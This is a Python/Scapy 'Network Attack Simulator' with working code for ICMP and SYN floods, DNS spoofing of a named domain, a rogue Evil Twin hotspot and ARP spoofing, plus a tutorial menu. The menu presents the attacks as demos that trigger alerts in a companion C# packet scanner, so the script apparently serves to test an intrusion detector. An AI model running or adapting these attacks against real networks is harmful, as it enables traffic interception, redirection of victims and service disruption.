import time
import subprocess
import threading
from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP, UDP
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.l2 import Ether, ARP

# ==========================================
# CONFIGURATION BLOCK - MODIFY THESE VALUES
# ==========================================

# --- Settings for Flood Attacks (ICMP & SYN) ---
FLOOD_TARGET_IP = "10.100.102.1"  # IP of the target (e.g., router or another PC). DO NOT use your own IP to avoid loopback issues.
SYN_TARGET_PORT = 80  # Target port for the SYN Flood

# --- Settings for DNS Spoofing ---
DNS_TARGET_DOMAIN = "ynet.co.il"  # The domain you want to spoof
DNS_FAKE_IP = "9.9.9.9"  # The fake IP you want to return to the victim

# --- Settings for Evil Twin (Hotspot) ---
EVIL_TWIN_SSID = "Free_Public_WiFi"  # Name of the fake network
EVIL_TWIN_PASS = "12345678"  # Password (must be at least 8 characters)

# --- Settings for ARP Spoofing ---
ARP_MY_IP = "192.168.1.100"  # The IP you are claiming to be (e.g., the router's IP)
ARP_MY_MAC = "aa:bb:cc:dd:ee:ff"  # Your actual MAC address
ARP_TARGET_IP = "192.168.1.50"  # The IP of the victim
ARP_TARGET_MAC = "ff:ff:ff:ff:ff:ff"  # Victim's MAC (ff:ff:ff... broadcasts to everyone)


# ==========================================
# ATTACK FUNCTIONS
# ==========================================

def icmp_flood():
    print(f"\n[+] Starting ICMP Flood against {FLOOD_TARGET_IP}...")
    packet = IP(dst=FLOOD_TARGET_IP) / ICMP()

    try:
        for i in range(10):
            send(packet, verbose=0)
            print(f"    Sent ICMP packet {i + 1}")
            time.sleep(0.1)
        print("[+] ICMP Flood completed.")
    except Exception as e:
        print(f"[-] Error during ICMP Flood: {e}")


def syn_flood():
    print(f"\n[+] Starting SYN Flood against {FLOOD_TARGET_IP}:{SYN_TARGET_PORT}...")
    packet = IP(dst=FLOOD_TARGET_IP) / TCP(sport=12345, dport=SYN_TARGET_PORT, flags="S")

    try:
        for i in range(20):
            send(packet, verbose=0)
            print(f"    Sent SYN packet {i + 1}")
            time.sleep(0.05)
        print("[+] SYN Flood completed.")
    except Exception as e:
        print(f"[-] Error during SYN Flood: {e}")


def dns_spoof_callback(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0 and pkt.haslayer(IP):
        qname = pkt.getlayer(DNS).qd.qname.decode().strip('.')
        if qname == DNS_TARGET_DOMAIN:
            ip_layer = pkt.getlayer(IP)
            dns_layer = pkt.getlayer(DNS)

            spoofed_pkt = IP(dst=ip_layer.src, src=ip_layer.dst) / \
                          UDP(dport=ip_layer.sport, sport=53) / \
                          DNS(id=dns_layer.id, qd=dns_layer.qd, aa=1, qr=1, \
                              an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=DNS_FAKE_IP))

            send(spoofed_pkt, verbose=0)
            print(f"\n[SUCCESS] Sent fake IP {DNS_FAKE_IP} for {qname}")
        else:
            print(f"[*] Ignoring query for: {qname}", end='\r')


def run_dns_spoofing():
    print(f"\n[+] DNS Spoofer active. Target: {DNS_TARGET_DOMAIN}")
    print("[!] Press Ctrl+C to stop sniffing and return to the main menu.")
    try:
        sniff(filter="udp port 53", prn=dns_spoof_callback, store=0)
    except KeyboardInterrupt:
        print("\n[+] DNS Spoofing stopped by user.")
    except Exception as e:
        print(f"[-] Error during DNS Spoofing: {e}")


def create_evil_twin():
    print(f"\n[+] Attempting to create Hotspot: {EVIL_TWIN_SSID}")
    try:
        setup_command = f'netsh wlan set hostednetwork mode=allow ssid={EVIL_TWIN_SSID} key={EVIL_TWIN_PASS}'
        subprocess.run(setup_command, shell=True, check=True, capture_output=True)

        start_command = 'netsh wlan start hostednetwork'
        subprocess.run(start_command, shell=True, check=True, capture_output=True)
        print(f"[SUCCESS] Network '{EVIL_TWIN_SSID}' is now active!")
    except subprocess.CalledProcessError:
        print("[-] Error: You must run this script as an Administrator to create a hotspot.")


def arp_spoof():
    print(f"\n[+] Sending ARP Reply telling {ARP_TARGET_IP} that {ARP_MY_IP} is at MAC {ARP_MY_MAC}...")
    pkt = Ether(dst=ARP_TARGET_MAC) / ARP(op=2, psrc=ARP_MY_IP, hwsrc=ARP_MY_MAC, pdst=ARP_TARGET_IP)

    try:
        sendp(pkt, verbose=1)
        print("[SUCCESS] ARP Packet sent.")
    except Exception as e:
        print(f"[-] Error during ARP Spoofing: {e}")


# ==========================================
# HELP SYSTEM (TUTORIALS)
# ==========================================

def display_help():
    while True:
        print("\n--- How to Execute Attacks (Tutorials) ---")
        print("1. How to demo ICMP Flood")
        print("2. How to demo SYN Flood")
        print("3. How to demo DNS Spoofing")
        print("4. How to demo Evil Twin")
        print("5. How to demo ARP Spoofing")
        print("0. Return to Main Menu")

        choice = input("Select a tutorial (0-5): ")

        if choice == '1':
            print("\n*** HOW TO DEMO: ICMP Flood ***")
            print("Step 1: Start your C# PacketScanner application.")
            print(
                "Step 2: Ensure FLOOD_TARGET_IP in this Python script is set to an external IP (like your router: 192.168.1.1). DO NOT use your own PC's IP to avoid loopback.")
            print("Step 3: Run this Python script and select option 1 from the main menu.")
            print("Result: The C# scanner will catch 10 packets in 1 second and trigger the ThreatBlocker pop-up.")

        elif choice == '2':
            print("\n*** HOW TO DEMO: SYN Flood ***")
            print("Step 1: Start your C# PacketScanner application.")
            print("Step 2: Ensure FLOOD_TARGET_IP is set to an external IP (e.g., the router).")
            print("Step 3: Run this Python script and select option 2 from the main menu.")
            print("Result: The C# scanner will catch 20 SYN packets in 1 second and trigger the ThreatBlocker pop-up.")

        elif choice == '3':
            print("\n*** HOW TO DEMO: DNS Spoofing ***")
            print("Step 1: Start your C# PacketScanner application.")
            print("Step 2: Run this Python script AS ADMINISTRATOR and select option 3. It will start listening.")
            print("Step 3: Open a separate Command Prompt (CMD) window.")
            print(f"Step 4: Type exactly: nslookup {DNS_TARGET_DOMAIN} 8.8.8.8 and press Enter.")
            print(
                "Result: The Python script will say 'SUCCESS', and your C# scanner will detect two conflicting MAC addresses for the same DNS ID, triggering an alert.")

        elif choice == '4':
            print("\n*** HOW TO DEMO: Evil Twin ***")
            print("Step 1: Run this Python script AS ADMINISTRATOR.")
            print(
                "Step 2: Start your C# PacketScanner application. Let it run for at least 5 seconds so it learns the 'baseline' SSID and BSSID of your current network.")
            print("Step 3: In the Python menu, select option 4 to start the rogue hotspot.")
            print(
                "Result: The C# background timer will detect a new hardware MAC (BSSID) broadcasting the same network name, triggering the Evil Twin alert.")

        elif choice == '5':
            print("\n*** HOW TO DEMO: ARP Spoofing ***")
            print("Step 1: Start your C# PacketScanner application.")
            print(
                "Step 2: In the Python configuration block, set ARP_MY_IP to an IP that already exists in the network, but use your own MAC address.")
            print("Step 3: Run this Python script and select option 5.")
            print(
                "Result: The C# scanner will compare the incoming ARP packet with its internal ARP table. Seeing a mismatched MAC for a known IP will trigger the ARP Spoofing alert.")

        elif choice == '0':
            break
        else:
            print("Invalid choice.")


# ==========================================
# MAIN MENU LOOP
# ==========================================

def main():
    print("========================================")
    print("       Network Attack Simulator")
    print("========================================")

    while True:
        print("\n--- Main Menu ---")
        print("1. Launch ICMP Flood")
        print("2. Launch SYN Flood")
        print("3. Launch DNS Spoofing")
        print("4. Launch Evil Twin (Hotspot)")
        print("5. Launch ARP Spoofing")
        print("6. Help & Tutorials")
        print("0. Exit")

        choice = input("Enter your choice (0-6): ")

        if choice == '1':
            icmp_flood()
        elif choice == '2':
            syn_flood()
        elif choice == '3':
            run_dns_spoofing()
        elif choice == '4':
            create_evil_twin()
        elif choice == '5':
            arp_spoof()
        elif choice == '6':
            display_help()
        elif choice == '0':
            print("Exiting Simulator. Goodbye!")
            break
        else:
            print("Invalid choice. Please select a number from the menu.")


if __name__ == "__main__":
    main()